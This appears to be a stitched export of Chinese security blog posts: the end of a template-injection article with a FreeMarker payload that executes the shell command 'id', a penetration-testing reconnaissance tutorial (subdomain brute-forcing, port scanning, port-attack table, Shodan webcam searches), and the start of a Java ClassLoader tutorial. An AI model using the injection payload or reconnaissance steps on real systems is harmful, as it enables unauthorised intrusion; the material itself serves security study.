<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;#list .data_model as key, object_test&gt;</span><br><span class="line"></span><br><span class="line">&lt;b&gt;Testing &quot;$&#123;key&#125;&quot;:&lt;/b&gt;&lt;br/&gt;</span><br><span class="line"></span><br><span class="line">&lt;#attempt&gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign classloader=object_test.class.protectionDomain.classLoader&gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign owc=classloader.loadClass(&quot;freemarker.template.ObjectWrapper&quot;)&gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign dwf=owc.getField(&quot;DEFAULT_WRAPPER&quot;).get(null)&gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign ec=classloader.loadClass(&quot;freemarker.template.utility.Execute&quot;)&gt;</span><br><span class="line"></span><br><span class="line">Shell ! (</span><br><span class="line"></span><br><span class="line">$&#123;dwf.newInstance(ec,null)(&quot;id&quot;)&#125;</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">&lt;#recover&gt;</span><br><span class="line"></span><br><span class="line">failed</span><br><span class="line"></span><br><span class="line">&lt;/#attempt&gt;</span><br><span class="line"></span><br><span class="line">&lt;br/&gt;&lt;br/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/#list&gt;</span><br></pre></td></tr></table></figure>



<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://cloud.tencent.com/developer/article/1516336">模板注入漏洞全汇总 - 云+社区 - 腾讯云 (tencent.com)</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1771497">详解模板注入漏洞（下） - 云+社区 - 腾讯云 (tencent.com)</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzAxODcyNjEzNQ==&mid=2247518980&idx=4&sn=2fa791299de826677ad77e28c9e053ee&chksm=9bd3269caca4af8a9659666c8fc5a272f6f0de5927dbe305e25dacc104cc02b2154dfebf4ac9&scene=21#wechat_redirect">详解模板注入漏洞（上） (qq.com)</a></p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>模板注入</category>
        <category>注入漏洞集合</category>
      </categories>
      <tags>
        <tag>-Web漏洞 -模板注入集合</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之信息收集(一)</title>
    <url>/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/</url>
    <content><![CDATA[<h1 id="渗透测试之信息收集-一"><a href="#渗透测试之信息收集-一" class="headerlink" title="渗透测试之信息收集(一)"></a>渗透测试之信息收集(一)</h1><h2 id="域名收集"><a href="#域名收集" class="headerlink" title="域名收集"></a>域名收集</h2><p>域名：（英语：<strong>Domain<br>Name</strong>),又称<strong>网域</strong>.是由一串用点分隔的名字组成的<a href="https://baike.baidu.com/item/Internet">Internet</a>上某一台计算机或计算机组的 名称 ，用于在数据传输时对计算机的定位标识（有时也指地理位置）。访问域名时通过DNS域名服务器进行与IP转换。</p>
<h3 id="Whois查询"><a href="#Whois查询" class="headerlink" title="Whois查询"></a>Whois查询</h3><p>Whois：是用来查询<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D/86062">域名</a>的IP以及所有者等信息的<a href="https://baike.baidu.com/item/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/8048821">传输协议</a>。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。whois通常使用TCP协议43端口。每个域名&#x2F;IP的whois信息由对应的管理机构保存。</p>
<p>Whois查询方法（两种）</p>
<ol>
<li><p>使用web接口查询</p>
<p>比如<a href="https://whois.aliyun.com/,http://whois.baidu.com/%E7%AD%89%E3%80%82%E8%BF%99%E9%87%8C%E4%BD%BF%E7%94%A8%E7%AB%99%E9%95%BF%E4%B9%8B%E5%AE%B6%E8%BF%9B%E8%A1%8Cwhois%E6%9F%A5%E8%AF%A2%E3%80%82">https://whois.aliyun.com/,http://whois.baidu.com/等。这里使用站长之家进行whois查询。</a></p>
<p>下面查看baidu.com域名信息显示被屏蔽，可能百度讲whois屏蔽无法访问</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/08a4eef7535f30bac9ecc5cb37d37778.png" class>



<p>如下查询aliyun.com域名信息，查询结果如下图所示</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/470994d66d9bf282dad079c0627de713.png" class>



<p>可以看到目标域名注册人的信息</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/a6dc9806f2324cf7d742e28880129fae.png" class>


</li>
<li><p>在kali linux上运行whois查询工具通过命令行来进行Whois域名进行查询.</p>
<p>这里使用whois查询baidu.com的域名信息，如下图所示</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/733284b552def66b38cc2110c50f5771.png" class></li>
</ol>
<h3 id="ICP查询"><a href="#ICP查询" class="headerlink" title="ICP查询"></a>ICP查询</h3><blockquote>
<p>  网络内容服务商英文为 Internet Content Provider<br>  简写为ICP，即向广大用户综合提供互联网信息业务和增值业务的电信运营商。其必须具备的证书即为ICP证。ICP证是指各地通信管理部门核发的《中华人民共和国电信与信息服务业务经营许可证》.icp备案对网站进行备案</p>
</blockquote>
<blockquote>
<p>  ICP查询方法（使用web接口查询）</p>
</blockquote>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/56eb1190e2de1a4fcb2f87797708863b.png" class>

<blockquote>
<p>  如下使用ICP备案查询网对baidu.com域名网站进行icp备案查询，显示许可证号，主办单位名称，网站名称和其网站所有子域名信息等</p>
</blockquote>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/7062e5befdff51e975be680cbe403fd9.png" class>



<h2 id="子域名信息收集"><a href="#子域名信息收集" class="headerlink" title="**子域名信息收集  **"></a>**子域名信息收集  **</h2><blockquote>
<p>  子域名：在顶级域名前加后缀的都是该顶级域名的子域名</p>
</blockquote>
<blockquote>
<p>  我国顶级域名为.cn，顶级域名的二级域名中类别域名有6个，.ac为科研机构，.com用于工商金融企业，.edu用于教育机构,.gov用于政府部门,.net用于互联网信息中心和运行中心，.org用于非营利组织</p>
</blockquote>
<blockquote>
<p>  当主域名防御措施完善时，我们可以通过拿下其子域名来对一步一步进行渗透</p>
</blockquote>
<h3 id="子域名挖掘工具"><a href="#子域名挖掘工具" class="headerlink" title="子域名挖掘工具"></a>子域名挖掘工具</h3><p>MaltegoCE，wydomin，subDomainsBrute，dnsmaper,layer子域名挖掘机。（具体查看工具使用方法）</p>
<p>这里使用wydomin对baidu.com域名进行子域名挖掘，使用命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./dnsburte.py -d baidu.com -f dnspod.csv -obaidu.txt</span><br></pre></td></tr></table></figure>



<p>使用字典对改域名进行爆破，及那个满足的域名保存在baidu.txt文件中</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/010b73ad82bcae8a0fe154efb90ce979.png" class>



<p>查看该文件，观察baidu.com下的子域名，其中包含了其子域名</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/668935855150b41fe29c91cc6d8a9eef.png" class>



<p>也可以使用APL进行匹配查询，使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./wydomain.py -d baidu.com -o baidu.log</span><br></pre></td></tr></table></figure>



<p>命令对baidu.com域名进行进一步查询，更加有效的收集子域名信息</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/6ca6f87c66b18171baa3b44b27054e33.png" class>



<p>查看收集到的子域名信息保存在baidu1.log，如下图就显示出很多子域名，更加有效</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/287f2f69cc2594a82b281c92cf15c73c.png" class>



<h3 id="搜索引擎挖掘"><a href="#搜索引擎挖掘" class="headerlink" title="搜索引擎挖掘"></a>搜索引擎挖掘</h3><p>如在Google中输入site:sina.com挖掘sina.com的子域名，对搜索出来的网址点击查找，但比较花费时间，子域名如下：</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/8057d03a65c6544f9029b04ff2c6092f.png" class>



<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/e73c286f9080e271d2465ad67faae787.png" class>



<h3 id="第三方查询网站"><a href="#第三方查询网站" class="headerlink" title="第三方查询网站"></a>第三方查询网站</h3><p>&lt;<a href="http://tool.chinaz.com/subdomain">http://tool.chinaz.com/subdomain</a> <a href="https://dnsdumpster.com/&gt;">https://dnsdumpster.com/&gt;</a></p>
<p>使用查询子域名工具查询子域名比较快捷方便，这里查询sina.com的相关子域名</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/5316f52ac092355b709115cb34dbeaf9.png" class>



<h3 id="证书透明公开日志枚举"><a href="#证书透明公开日志枚举" class="headerlink" title="证书透明公开日志枚举"></a>证书透明公开日志枚举</h3><p> &lt;<a href="http://crt.sh/">http://crt.sh/</a> <a href="http://censys.io/&gt;">http://censys.io/&gt;</a></p>
<h3 id="其他途径"><a href="#其他途径" class="headerlink" title="其他途径"></a>其他途径</h3><p> <a href="http://phpinfo.me/domain">http://phpinfo.me/domain</a> <a href="http://dns.aizhan.com/">http://dns.aizhan.com</a></p>
<h2 id="web站点信息收集"><a href="#web站点信息收集" class="headerlink" title="web站点信息收集"></a><strong>web站点信息收集</strong></h2><blockquote>
<p>  CMS(content managementsystem内容管理系统)，用于网站内容管理内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。</p>
</blockquote>
<h3 id="CMS识别工具"><a href="#CMS识别工具" class="headerlink" title="CMS识别工具"></a>CMS识别工具</h3><p>常见CMS工具：dedecms(织梦) DIscuz Phpcms等</p>
<h4 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h4><p>  <a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a>  <a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p>
<p>如识别织梦CMS，该工具将会显示该网站的CMS为dedecms</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/c28013fb2f83a0b6573e55c669b311a8.png" class>

<h4 id="本地工具"><a href="#本地工具" class="headerlink" title="本地工具"></a>本地工具</h4><p>whatweb  御剑web指纹识别程序  大禹CMS识别程序</p>
<h3 id="CMS漏洞"><a href="#CMS漏洞" class="headerlink" title="CMS漏洞"></a>CMS漏洞</h3><p>(<a href="https://bugs.shuimugan.com/">https://bugs.shuimugan.com</a>)使用一些在线查询漏洞查询Cms漏洞相关厂商的情况</p>
<p>Wordpress（架设自己网站，当作cms来使用）</p>
<p>使用cms查询工具对其进行查询，查询出该cms的域名相关信息</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/57507dd46949d2cf557018aed1a5ea38.png" class>



<h2 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a><strong>端口信息收集</strong></h2><blockquote>
<p>  我们在windows命令窗口下输入netstat -anbo显示本机的所有端口情况，如下图</p>
</blockquote>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/6ee2c0f8ec3348578ea7f341c0593268.png" class>



<h3 id="工具探测"><a href="#工具探测" class="headerlink" title="工具探测"></a>工具探测</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 输入nmap -A -v -T4探测</span><br><span class="line"></span><br><span class="line">masscan -P端口  网段 –rate=10000</span><br><span class="line"></span><br><span class="line">使用在线工具进行探测目标主机的端口开放</span><br></pre></td></tr></table></figure>



<h3 id="端口攻击"><a href="#端口攻击" class="headerlink" title="端口攻击"></a>端口攻击</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22  SSH远程连接      爆破,SSH隧道及内网代理转发。文件传输</span><br><span class="line"></span><br><span class="line">23  Telnet远程连接     爆破、嗅探、弱口令</span><br><span class="line"></span><br><span class="line">3389 rdp远程桌面      shift后门、爆破</span><br><span class="line"></span><br><span class="line">5900 VNC远程连接     弱口令、RCE</span><br><span class="line"></span><br><span class="line">5632 Pcanywhere远程连接  嗅探、代码执行</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/zhalang8324/article/details/78904692">https://blog.csdn.net/zhalang8324/article/details/78904692</a></p>
<p>防御方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">关闭不必要的端口</span><br><span class="line"></span><br><span class="line">对服务端口设置防火墙</span><br><span class="line"></span><br><span class="line">加强员工信息安全意识，经常更换用户密码</span><br><span class="line"></span><br><span class="line">经常更新软件，补丁</span><br></pre></td></tr></table></figure>



<h2 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a><strong>敏感信息收集</strong></h2><p>Google hack语法：对特定网络主机漏洞进行搜索，方便查找</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/3408b3138f5bdfd4d621db6f47b249a3.png" class>

<blockquote>
<p>  通过HTTP或者HTTPS与目标站点进行通信时，响应报文中的seber头和X-powered-by头会暴露目标服务器使用的编程语言，通过这些信息进行漏洞利用</p>
</blockquote>
<p>获取HTTP响应的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.利用工具 如：浏览器审计工具、burpsuite等代理截断工具</span><br><span class="line"></span><br><span class="line">2.编写python脚本  request库</span><br><span class="line">  参考链接：[ttp://www.python-requests.org/en/master](http://www.python-    </span><br><span class="line">  requests.org/en/master)</span><br><span class="line"></span><br><span class="line">    Import requests</span><br><span class="line"></span><br><span class="line">    R=requests.get(‘目标站点’)</span><br><span class="line"></span><br><span class="line">    Print(r.headers)</span><br></pre></td></tr></table></figure>



<h3 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h3><p>Gitthub是一个面向<a href="https://baike.baidu.com/item/%E5%BC%80%E6%BA%90/20720669">开源</a>及私有<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6/12053">软件</a>项目的托管平台，因为只支持Git 作为唯一的版本库格式进行托管</p>
<p>存在安全隐患：</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/175f8a115329e108c90d5701136b7733.png" class>



<h2 id="真实IP收集"><a href="#真实IP收集" class="headerlink" title="真实IP收集"></a>真实IP收集</h2><p>CDN的全称是Content Delivery  Network，即<a href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C/4034265">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。</p>
<h3 id="判断CDN"><a href="#判断CDN" class="headerlink" title="判断CDN"></a>判断CDN</h3><h4 id="多地ping"><a href="#多地ping" class="headerlink" title="多地ping"></a>多地ping</h4><p>通过ping来判断是否存在CDN.(ping baidu.com )通过观察发现存在CDN</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/888bf4f927af5fed03536046d2b021e3.png" class>



<p>通过在线ping网站或者代理测试目标</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/0fa40e37784e87b5b384db73c51f1e21.png" class>



<p>探测结果，发现很多DNS，存在大量的边缘服务器</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/8ff8cab6b50bb1848d934678fc66bac6.png" class>



<h3 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h3><img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/424d127aeca5709b36b2229dc5bd0ae9.png" class>



<h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><p>在shado网站中搜索webcam摄像头信息可以查看摄像头内容</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/dca860ca1d7562cce4c752cf5819a2db.png" class>



<p>使用搜索port:指定端口搜索主机，查看主机开放端口内容以及位置信息</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/93045e3a2e16fbfec68822145c7ace7e.png" class>

<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/f0930bfece399a4a2d8715912e6e176f.png" class>

<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/d53c5bebed6a08f5c3655e662755206b.png" class>

<p>Shado命令行：</p>
]]></content>
      <categories>
        <category>内功心法</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>-渗透测试 -信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>ClassLoader类加载机制</title>
    <url>/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="ClassLoader类加载机制"><a href="#ClassLoader类加载机制" class="headerlink" title="ClassLoader类加载机制"></a>ClassLoader类加载机制</h1><p>这篇文章算是记录学习代码审计的基础知识，了解java代码中类的加载在JVM中的底层流程。</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Java程序执行流程可以分为三部分:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编写源代码</span><br><span class="line"></span><br><span class="line">编译字节码</span><br><span class="line"></span><br><span class="line">运行java程序</span><br></pre></td></tr></table></figure>



<p><strong>加载过程</strong></p>
<ul>
<li>使用java语法根据程序执行逻辑运算来编写java源代码(.java)</li>
<li>源代码使用编译器javac将其编译成存储着JVM指令的二进制信息的字节码文件(.class)</li>
<li>当调用某个类时，JVM虚拟机会将其放在运行数据区的方法区，在堆区创建一个java.lang.Class对象，用来封装类早方法区内的数据结构。</li>
</ul>
<p>ClassLoader类加载的最终结果是位于堆栈区的java.lang.Class对象，封装类在方法区内的数据结构，还提供了一个访问方法区的数据结构的接口。 </p>
<h2 id="类的生命周期"><a href="#类的生命周期" class="headerlink" title="类的生命周期"></a>类的生命周期</h2><p>类的生命周期经历四个过程: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加载--&gt;连接(验证，准备，解析)--&gt;初始化--&gt;结束生命周期</span><br></pre></td></tr></table></figure>

<p>如图所示:</p>
<img src="/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20211201113220253.png" class title="image-20211201113220253">







<h3 id="类的加载"><a href="#类的加载" class="headerlink" title="类的加载"></a>类的加载</h3><p>类的加载在上面的概述中已经解释了，就是JVM虚拟机把源代码编译成字节码二进制文件并将其放在java堆中生成一个java.lang.Class类对象。</p>
<h3 id="类的连接"><a href="#类的连接" class="headerlink" title="类的连接"></a>类的连接</h3><p>类的连接分为验证、准备、解析三部分。</p>
<ul>
<li><p>验证:检测加载类的二进制文件字节流安全性，文件字节流包含信息是否符合当前虚拟机要求并且不会危害虚拟机自身安全。</p>
<p>主要分为4个阶段的检验动作:</p>
<ul>
<li>文件格式验证:验证加载类的字节流文件是否符合Class文件的格式规范。</li>
<li>元数据验证:    对字节码文件中描述的信息进行语义分析，检测是否符合java语言规范的要求。</li>
<li>字节码验证:    提供数据流和控制流来分析程序语义是否合法和符合逻辑的。</li>
<li>符号引用验证: 确保解析动作是否能正确执行。</li>
</ul>
</li>
<li><p>准备:为加载类中的静态变量(static修饰的变量)分配内存并将其初始化为默认值.</p>
<p>​         举个栗子:     <strong>Static int test &#x3D; 10</strong></p>
<p>​         在该步骤会将test初始化为默认值0。值得一提的是，10的赋值会在初始化阶段完成。</p>
</li>
<li><p>解析:把类中的符号引用转换成直接引用。直接指向目标的指针、相对偏移量或一个简介定位到目标的句柄。</p>
</li>
</ul>
<h3 id="类的初始化"><a href="#类的初始化" class="headerlink" title="类的初始化"></a>类的初始化</h3><p>这是类加载的最后阶段，为静态变量赋值。若该类具有父类，则先对父类进行初始化。</p>
<p>初始化步骤:</p>
<ul>
<li>这个类没有被加载和连接，程序先加载并连接该类</li>
<li>该类的直接父类还没有被初始化，先初始化其父类</li>
<li>该类中有初始化语句，依次执行初始化语句</li>
</ul>
<h3 id="结束生命周期"><a href="#结束生命周期" class="headerlink" title="结束生命周期"></a>结束生命周期</h3><p>JVM虚拟机结束生命周期，有如下几种情况:</p>
<ul>
<li>执行system.exit()方法</li>
<li>程序正常执行结束</li>
<li>程序在执行过程中遇到了异常或错误导致异常终止</li>
<li>由于操作系统出现错误而导致jvm虚拟机进程终止</li>
</ul>
<h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>在 JVM中，类的加载是由类加载器完成的。类加载器可分为JVM自带的类加载器和用户自定义的类加载器。</p>
<ul>
<li>JVM自带的类加载器: 引导类加载器(根类加载器)、扩展类加载器、系统类加载器。</li>
<li>用户自定义的类加载器：java.lang.ClassLoader的子类实例。</li>
</ul>
<h3 id="JVM内置加载器"><a href="#JVM内置加载器" class="headerlink" title="JVM内置加载器"></a>JVM内置加载器</h3><h4 id="根类加载器-Bootstrap-ClassLoader"><a href="#根类加载器-Bootstrap-ClassLoader" class="headerlink" title="根类加载器(Bootstrap ClassLoader)"></a>根类加载器(Bootstrap ClassLoader)</h4><ul>
<li>最底层的类加载器，没有父加载器，也没有继承java.lang.ClassLoader类</li>
<li>加载sun.boot.class.path指定路径下的核心类库(<code>%JAVAHOME%/jre/lib/rt.jar</code>中的文件)</li>
<li>只加载java,javax,sun开头的类</li>
</ul>
<p>Demo代码如下；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Classloader_test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Classloader_test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        ClassLoader classloader = Object.class.getClassLoader();</span><br><span class="line">        System.out.println(classloader); <span class="comment">//根类加载器打印的结果是null</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果；</p>
<img src="/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20211130151121972.png" class title="image-20211130151121972">





<h4 id="扩展类加载器-Extension-ClassLoader"><a href="#扩展类加载器-Extension-ClassLoader" class="headerlink" title="扩展类加载器(Extension ClassLoader)"></a>扩展类加载器(Extension ClassLoader)</h4><ul>
<li>通常来说，扩展类加载器的父类加载器是根类加载器，其实它只是具备根类加载器的功能。扩展类加载器的父类加载器为null，当loadClass方法中的parent为null时，交由根类加载器来处理。</li>
<li>扩展类加载器主要用于加载<code>%JAVAHOME%/jre/lib/ext</code>目录下的类库或者系统变量<code>java.ext.dirs</code>指定目录下的类库</li>
</ul>
<img src="/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20211130152410967.png" class title="image-20211130152410967">

<p>Demo代码:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Classloader_test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Classloader_test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        ClassLoader classLoader1 = DNSNameService.class.getClassLoader();</span><br><span class="line">        System.out.print(<span class="string">&quot;DNSNameservice类的加载器为:&quot;</span>+ classLoader1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20211130153119832.png" class title="image-20211130153119832">

<p>可以看到此时类加载器为扩展类加载器</p>
<h4 id="系统类加载器-App-ClassLoader"><a href="#系统类加载器-App-ClassLoader" class="headerlink" title="系统类加载器(App ClassLoader)"></a>系统类加载器(App ClassLoader)</h4><ul>
<li>默认的类加载器，负责从classpath环境变量或者系统属性java.classs.path所指定的目录中加载类</li>
<li>在不指定类加载器的情况下，默认使用系统类加载器加载类，它的父类是扩展类加载器。通过ClassLoader.getSystemClassLoader()来获得</li>
</ul>
<p>Demo代码如下；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Classloader_test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Classloader_test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        ClassLoader loader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">        System.out.println(<span class="string">&quot;默认类加载器为:&quot;</span>+loader);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>运行结果；</p>
<img src="/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20211130153857499.png" class title="image-20211130153857499">



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注:JVM加载类是按需加载的，只有需要使用该类时才会将它的class文件加载到内存生成class对象。并且加载某个类时，JVM采用双亲委派模式，将加载类的请求交由父加载器处理，是一种任务委派模式。</span><br></pre></td></tr></table></figure>



<h4 id="双亲委派"><a href="#双亲委派" class="headerlink" title="双亲委派"></a>双亲委派</h4><p>除了根类加载器之外，其他的类加载器都需要自己的父加载器。类的加载过程采用双亲委派机制，当类加载器加载一个类时，会先委托自己的父类加载器加载这个类，若父类加载器能够加载则由父类加载器加载，否则由自己加载该类。</p>
<p>如图:</p>
<img src="/2021/12/01/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20211201113721976.png" class title="image-20211201113721976">



<p>Demo代码:</p>
